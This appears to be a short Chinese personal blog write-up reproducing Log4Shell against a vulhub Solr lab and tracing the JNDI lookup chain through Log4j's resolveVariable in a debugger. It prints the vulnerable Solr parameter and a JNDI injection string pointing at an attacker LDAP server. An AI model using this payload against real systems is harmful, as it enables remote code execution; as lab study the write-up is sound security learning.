# Log4j

<br>

## 写在前面

<br>

没想到不到一年我已经进步到能看得懂分析文章，再自己写文章的水平了。希望今年再接再厉吧，

<br>

## 利用

<br>

这里我用vulhub的容器搭建的，靶机地址为172.27.118.120

<br>

<img src="https://54huarui.github.io/blogs/log4j2/2.png" width="880" height="480">

<br>

有个传入参数的点

````
http://172.27.118.120:8983/solr/admin/cores?action=
````

我还是刚刚用JNDI-Injection-Exploit起一个恶意服务器。

<br>

<img src="https://54huarui.github.io/blogs/log4j2/3.png" width="880" height="480">

<br>


直接打poc即可

<br>

<img src="https://54huarui.github.io/blogs/log4j2/1.png" width="880" height="480">

<br>

<img src="https://54huarui.github.io/blogs/log4j2/4.png" width="880" height="480">

<br>

## 关于链子

<br>

这条链子的利用比我想象的简单

JNDI需要被利用的话，需要用到InitialContext.lookup()函数，我们直接搜索函数，在look up处下断点

<br>

<img src="https://54huarui.github.io/blogs/log4j2/5.png" width="880" height="480">

<br>

断下后查看上一帧，可以看到这里传入的name的值就是我们的ldap地址

<br>

<img src="https://54huarui.github.io/blogs/log4j2/6.png" width="880" height="480">

<br>

继续往回走几帧，在这里可以发现它调用了一个resolveVariable方法，传入了参数buf 和varname

<br>

<img src="https://54huarui.github.io/blogs/log4j2/7.png" width="880" height="480">

<br>

````
varName=jndi:ldap://26.119.104.107:1389/opvrki

buf=${jndi:ldap://26.119.104.107:1389/opvrki}
````

<br>

继续跟进这个函数

````
    protected String resolveVariable(final LogEvent event, final String variableName, final StringBuilder buf, final int startPos, final int endPos) {
        StrLookup resolver = this.getVariableResolver();
        return resolver == null ? null : resolver.lookup(event, variableName);
    }
````

这个函数的作用就是解析变量，他会把${}里面的字符串尝试解析成变量的值。

往前走一帧，就可以看到他已经把jndi和ldap:分离出来了

<br>

<img src="https://54huarui.github.io/blogs/log4j2/8.png" width="880" height="480">

<br>


<br>

<img src="https://54huarui.github.io/blogs/log4j2/9.png" width="880" height="480">

<br>

在这里他将我们的值进入look up方法，继续回走两帧看看去了哪。

<br>

<img src="https://54huarui.github.io/blogs/log4j2/10.png" width="880" height="480">

<br>

到这里他进入了context.look()方法，这个方法就已经是可以被利用为JNDI的地方，也就是为什么我们能利用JDNI进行注入。

<br>


## 写在最后

<br>

感谢



